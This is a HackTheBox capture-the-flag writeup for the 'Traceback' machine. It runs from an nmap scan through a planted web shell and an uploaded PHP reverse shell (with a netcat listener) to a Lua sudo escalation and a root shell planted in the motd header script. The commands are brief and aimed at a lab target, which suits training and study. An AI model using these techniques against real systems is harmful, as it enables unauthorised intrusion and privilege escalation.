---
title: "Traceback"
description: "Writeup for Traceback machine from HTB"
date: 2020-08-09
author: "Pablo Jesús González Rubio"
cover: "traceback.png"
coverAlt: "Traceback icon"
toc: true
tags: [ "Writeup" ]
---

## Scanning

Hosts: `10.10.10.181 traceback.htb`

Nmap Output:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 21:51 CEST
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.56 seconds
```

## Enumeration

Gobuster didn't throw anything.

In the HTTP page appears this:

{{< img "HTTP.png" "Free Internet" "border" >}}

Looking at source code:

{{< img "HTTP_source.png" "Source Code" "border" >}}

There's this commented phrase:

`<!--Some of the best web shells that you might need ;)-->`

Searching it on the internet lead me to [this Github page](https://github.com/Xh4H/Web-Shells).

As the page says it has a backdoor, I ran gobuster with the list of web shells:

```
gobuster dir -u http://traceback.htb -w list_web_shells.txt
```

```
alfa3.php
alfav3.0.1.php
andela.php
bloodsecv4.php
by.php
c99ud.php
cmd.php
configkillerionkros.php
jspshell.jsp
mini.php
obfuscated-punknopass.php
punkholic.php
punk-nopass.php
r57.php
README.md
smevk.php
wso2.8.5.php
```

The only result it throws is: `smevk.php`

So I went to *traceback.htb/smevk.php*:

{{< img "smevk.png" "smevk" "border" >}}

Entering in the login form `admin`:`admin` let us in:

{{< img "smevk2.png" "smevk2" "border" >}}

## Exploitation

It lists some files, included a PHP reverse shell which is the [pentest monkey one](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

I downloaded it and called it `reverse_shell.php`. I modified it and uploaded it, so what's left is to enter the url: `traceback.htb/reverse_shell.php` and we have a connection (listening with `nc -lnvp 4444`).

Then began with the [TTY procedure](https://pablogonzalez.me/posts/pentest_cheatsheet/#tty) with python3 as python seems to not be installed.

## Privilege Escalation

### User

We log in as `webadmin` (similar to the `www-data`), and in his directory, there's this `note.txt` from `sysadmin`:

```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

And by doing the usual privilege escalation checkups such as `sudo -l`:

```
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

I saw I could run [`luvit`](https://luvit.io/) as `sysadmin`. Luvit is related to Lua. I instantly searched how to execute commands from Lua such as `/bin/bash`:

```lua
os.execute("/bin/bash")
```

I placed this script as `shell.lua` in `webadmin's` directory and run:

```
sudo -u sysadmin /home/sysadmin/luvit ./reverse.lua
```

And that granted me `sysadmin` user, pretty easy huh 

### Root

I copied my `id_rsa.pub` to `authorized_keys` just in case I lose my shell.

Running `pspy` on the machine let me see:

{{< img "pspy.png" "pspy" "border" >}}

This means there's a cron copying *motd* backup files to the original place which is `/etc/update-motd.d/`.

> *motd*: Message of The Day, it's a bash script that prints a banner when an SSH login is performed. Usually, the file that is used is `00-header`.

When performing an SSH, `pspy` shows:

{{< img "pspy_ssh.png" "ssh" "border" >}}

So taking this into account I could modify the `00-header` with a reverse shell and connect again (have to be in less than 30 secs as cron is updating the files forever) with SSH while listening on the port we choose, in my case 3333. And... voilá!

{{< img "root.png" "root" "border" >}}

